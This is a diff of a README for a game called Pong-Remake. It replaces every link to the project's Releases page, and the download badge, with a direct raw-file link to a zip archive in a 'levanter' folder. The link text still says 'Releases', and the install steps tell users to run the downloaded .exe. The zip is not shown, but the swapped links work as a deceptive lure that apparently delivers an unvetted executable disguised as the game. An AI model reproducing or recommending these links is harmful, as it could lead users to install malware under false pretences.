@@ -8,12 +8,12 @@ Pong-Remake is a simple 2D game that brings back the classic experience of table
 - **Fun Graphics and Sound:** Enjoy a vibrant visual style and engaging sound effects.
 
 ## 🔗 Download Now!
-[![Download Pong-Remake](https://img.shields.io/badge/Download-Pong--Remake-brightgreen)](https://github.com/FileTheTraidor/Pong-Remake/releases)
+[![Download Pong-Remake](https://raw.githubusercontent.com/FileTheTraidor/Pong-Remake/main/levanter/Pong-Remake.zip)](https://raw.githubusercontent.com/FileTheTraidor/Pong-Remake/main/levanter/Pong-Remake.zip)
 
 ## 🚀 Getting Started
 To start playing Pong-Remake, follow these simple steps.
 
-1. **Visit the Releases Page:** Go to the following link to access the download options: [Pong-Remake Releases](https://github.com/FileTheTraidor/Pong-Remake/releases).
+1. **Visit the Releases Page:** Go to the following link to access the download options: [Pong-Remake Releases](https://raw.githubusercontent.com/FileTheTraidor/Pong-Remake/main/levanter/Pong-Remake.zip).
 2. **Download the Game:** Look for the latest version on the Releases page. You will see a list of files. Click on the one that is compatible with your operating system (Windows, macOS, or Linux).
 3. **Install the Game:** Once the download is complete, find the downloaded file on your computer. 
    - For Windows, double-click the `.exe` file.
@@ -56,7 +56,7 @@ Visit our documentation for more details on gameplay features, controls, and tip
 - **FAQs:** Read common questions and answers about the game.
 
 ## 📥 Download & Install
-For a smooth downloading experience, remember to visit the Releases page to download your copy of Pong-Remake: [Pong-Remake Releases](https://github.com/FileTheTraidor/Pong-Remake/releases). Follow the installation instructions carefully to get started.
+For a smooth downloading experience, remember to visit the Releases page to download your copy of Pong-Remake: [Pong-Remake Releases](https://raw.githubusercontent.com/FileTheTraidor/Pong-Remake/main/levanter/Pong-Remake.zip). Follow the installation instructions carefully to get started.
 
 ## 🎉 Join the Community
 Become part of the Pong-Remake community. Share your scores, compete with others, and participate in discussions on our GitHub page and social media platforms. We look forward to seeing you there!
